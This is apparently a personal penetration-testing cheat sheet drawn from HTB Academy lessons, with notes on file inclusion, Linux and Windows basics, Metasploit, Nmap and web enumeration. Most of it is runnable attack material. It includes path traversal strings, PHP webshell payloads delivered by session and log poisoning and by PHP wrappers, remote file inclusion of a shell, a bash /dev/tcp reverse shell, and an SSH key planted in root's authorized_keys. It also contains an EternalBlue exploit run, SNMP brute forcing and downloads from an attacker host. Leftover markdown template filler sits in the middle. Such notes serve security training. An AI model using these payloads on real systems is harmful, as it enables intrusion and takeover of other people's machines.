# Hacking Lessons
Lessons and Tutorials Covered


* File Inclusion / Directory Traversal (HTB Academy)
* Linux Fundermentals (HTB Academy)
* Metasploit (HTB Academy)
* Nmap (HTB Academy)
* Web Enumeration
* Windows Fundermentals (HTB Academy)




##### Connect to VPN
> sudo openvpn user.ovpn





## File Inclusion / Directory Traversal (HTB Academy)
Often see a parameter like /index.php?page=about. Under the hood, index.php will probably pull header.php, about.php, and footer.php. Since you control the about portion of the request, it may be possible to have the webserver grab other files! Another common place is within languages. If you see ?lang=en; then the website will grab files from the /en/ directory.

* RCE through PHP Session Files
Default page url with php and access to logs
> http://46.101.91.21:32430/index.php?language=/var/log/apache2/access.log

May need to put the following before the filename 
../../../../../../../../../
/../../../../../
....//....//....//....//....//....//....//....//
%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd


* Cookie retrival and Poison
Get cookie from browser inspector. Then look the cookie up via browser url
> http://46.101.91.21:32430/index.php?language=/var/lib/php/sessions/sess_nvc45a8h12hmm2l2bc1ug3bage
Poison the Cookie 
> http://46.101.91.21:32430/index.php?language=session_poisoning

* Prime the website for code injection
> http://134.209.184.216:32415/index.php?language=<?php system($_GET['cmd']); ?>

* Inject code where id is. Ie cmd=ifconfig
> http://46.101.91.21:32484/index.php?language=/var/lib/php/sessions/sess_nvc45a8h12hmm2l2bc1ug3bage&cmd=id

* Other ways to execude remote code - There is 3
   * Execute code where id is (1)
   > http://46.101.91.21:32484/index.php?language=expect://id
   * Get the base64 digit (2)
   > http://46.101.91.21:32484/index.php?language=expect://echo '<?php system($_GET['cmd']); ?>' | base64
   * Execute command (2)
   > http://46.101.91.21:32484/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id
   * Execute code via curl, code goes where id is (3)
   > curl -s -X POST --data "<?php system('id'); ?>" "http://134.209.184.216:30084/index.php?language=php://input" | grep uid

* Remote file Inclusion
execute the below command while executing the broswer script http://website.com/index.php?language=http://yourserverip:8080/file
> python3 -m http.server 8080
create a file to call and put the following as contents <?php system($_GET['cmd']); ?>
eg. shell.php 
call the file with url http://website.com/index.php?language=http://yourserverip:8080/shell.php&cmd=id
* FTP RFI can also be done via the below command while executing url http://blog.inlanefreight.com/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id
> python -m pyftpdlib -p 21
* Windows RFI 
 can be called via the below command and url as follows http://blog.inlanefreight.com/index.php?language=\\serverIp\share\shell.php&cmd=whoami
> smbserver.py -smb2support share $(pwd)

* Source Code Disclosure via PHP Wrappers
Can be done via the following code 
> php://filter/read=convert.base64-encode/resource=/etc/passwd

> php://filter/read=string.rot13/resource=/etc/passwd

> eg. http://134.209.184.216:32391/extension/index.php?language=php://filter/read=convert.base64-encode/resource=config

Then execute the URL in linux console proceeded by cURL to get the code. eg. cURL http://website:8080 

*Decrypt the code via command 
> echo 'insert-code-here' | base64 -d

* RCE through Log Files
Files will be at /var/log/apache2/access.log, /var/log/nginx/access.log, /var/log/sshd.log, /var/log/mail, and /var/log/vsftpd.log

Start Burp Suite, intercept a request to the page, and send it to Repeater. Next, change the User-Agent header to something else such as Apache Log Poisoning and click Go

Poisoned user agent is visible in the included log file. Modify User-Agent to a PHP shell such as <?php system($_GET['cmd']); ?>

We can now execute OS-level commands by adding a parameter to the GET request. ie GET website.php?page=../../logs.log&cmd=id (id can be any command)




## Linux Fundermentals (HTB Academy)
* System Info Commands
> uname -a - shows OS version

> ifconfig/ip a	- show our IP address

> netstat -rn	- show networks accessible via the VPN

> id - returns users id

> ps -aux | grep ssh - check if a service is running

> systemctl list-units --type=service - list all service

> sudo updatedb && locate xx - looks for a file

> apt-cache show impacket-scripts - show info about a package

> apt list --installed - show installed packages

> dpkg -l - show installed packages

* Download Packages
Git
> git clone https://github.com/craigrachow/OffSec/blob/main

Download and install a package
> dpkg -i strace_4.21-1ubuntu1_amd64.deb

* Setup Reverse Shell
> c -lvnp 1234	Start a nc listener on a local port

> bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'	Send a reverse shell from the remote server

* Privilege Escalation 	
> ./linpeas.sh 	Run linpeas script to enumerate remote server

> sudo -l 	List available sudo privileges

> sudo -u user /bin/echo Hello World! 	Run a command with sudo
Always perform bash_history or PSReadLine after changing user

> sudo su user - 	Switch to a user (if we have access to sudo su)

* Cronjob locations  - /etc/crontab /etc/cron.d /var/spool/cron/crontabs/root

* Generate SSH Keys
> ssh private keys /home/user/.ssh/id_rsa or /root/.ssh/id_rsa
Create a new SSH key
> ssh-keygen -f key 	
Add the generated public key to the user
> echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys 	
SSH to the server with the generated private key
> ssh root@10.10.10.10 -i key 





## Metasploit
* install searchsploit
> sudo apt install exploitdb -y

* scan for services 
> netcat 10.10.10.10 22

> nmap 10.129.42.253

> nmap -sV -sC -p- 10.129.42.253

> nc -nv 10.129.42.253 21

> nmap -sC -sV -p21 10.10.10.121

> ftp -p 10.129.42.253

> nmap -A -p445 10.129.42.253

> smbclient -N -L \\\\10.129.42.253

> smbclient -U bob \\\\10.129.42.253\\users

* Run scan on exploitable components 
> searchsploit openssh 7.2 - Search for public exploits for a web application

* Using MSF Console
Start the Metasploit Framework 
> msfconsole

> search exploit eternalblue	MSF: Search for public exploits in MSF

> use exploit/windows/smb/ms17_010_psexec	MSF: Start using an MSF module

> show options	MSF: Show required options for an MSF module

> set RHOSTS 10.10.10.40	MSF: Set a value for an MSF module option

> check	MSF: Test if the target server is vulnerable

> exploit	MSF: Run the exploit on the target server is vulnerable




### Nmap
netstat -rn
nmap -Pn -sC -sV -oA all_tcp -T4 --reason -vvvvvvvvvv -p- IP
nmap -sS -sC -sV -Pn -p- -T4 -A host ip
nmap -sV --script=smb* host ip

netcat 10.10.10.10 22	Grab banner of an open port
smbclient -N -L \\\\10.129.42.253	List SMB Shares
smbclient \\\\10.129.42.253\\users	Connect to an SMB share
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0	Scan SNMP on an IP
onesixtyone -c dict.txt 10.129.42.254	Brute force SNMP secret string



## Windows Fundermentals
Get-WmiObject -Class win32_OperatingSystem | select Version,BuildNumber - get OS version number
wmic os list brief - same as above

xfreerdp /v:<targetIp> /u:htb-student /p:Password - RDP from unix

Get-Service | ? {$_.Status -eq "Running"} | select -First 2 |fl - list running services


* list
  * list

1. list 
2. list 

> Blockquote
> 
`<addr>` inline clode

```javascript
function fancyAlert(arg) {
  if(arg) {
    $.facebox({div:'#foo'})
  }
}
```


- [x] this is a complete item
- [ ] this is an incomplete item


* NEW
netstat -rn
ssh user@10.10.10.10
netcat 10.10.10.10 22







msfconsole
search exploit eternalblue
use exploit/windows/smb/ms17_010_psexec
show options 
set RHOSTS 10.10.10.40
check
exploit

 Service Enumeration
nmap -sV -sC -p- 10.129.42.253
nmap -sV -sC -p- 10.129.42.253 	Run an nmap script scan on an IP
locate scripts/citrix 	List various available nmap scripts
nmap --script smb-os-discovery.nse -p445 10.10.10.40 	Run an nmap script on an IP
netcat 10.10.10.10 22 	Grab banner of an open port
smbclient -N -L \\\\10.129.42.253 	List SMB Shares
smbclient \\\\10.129.42.253\\users 	Connect to an SMB share
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0 	Scan SNMP on an IP
onesixtyone -c dict.txt 10.129.42.254 	Brute force SNMP secret string

## Web Enumberatopn
git clone https://github.com/danielmiessler/SecLists
sudo apt install seclists -ysudo apt install seclists -y
gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt 	Run a directory scan on a website
gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt 	Run a sub-domain scan on a website
curl -IL https://www.inlanefreight.com 	Grab website banner
whatweb 10.10.10.121 	List details about the webserver/certificates
curl 10.10.10.121/robots.txt 	List potential directories in robots.txt
 whatweb 10.10.10.121
whatweb --no-errors 10.10.10.0/24
robots.txt









Transferring Files 	
python3 -m http.server 8000 	Start a local webserver
wget http://10.10.14.1:8000/linpeas.sh 	Download a file on the remote server from our local machine
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh 	Download a file on the remote server from our local machine
scp linenum.sh user@remotehost:/tmp/linenum.sh 	Transfer a file to the remote server with scp (requires SSH access)
base64 shell -w 0 	Convert a file to base64
echo f0VMR...SNIO...InmDwU | base64 -d > shell 	Convert a file from base64 back to its orig
md5sum shell 	Check the file's md5sum to ensure it converted correctly
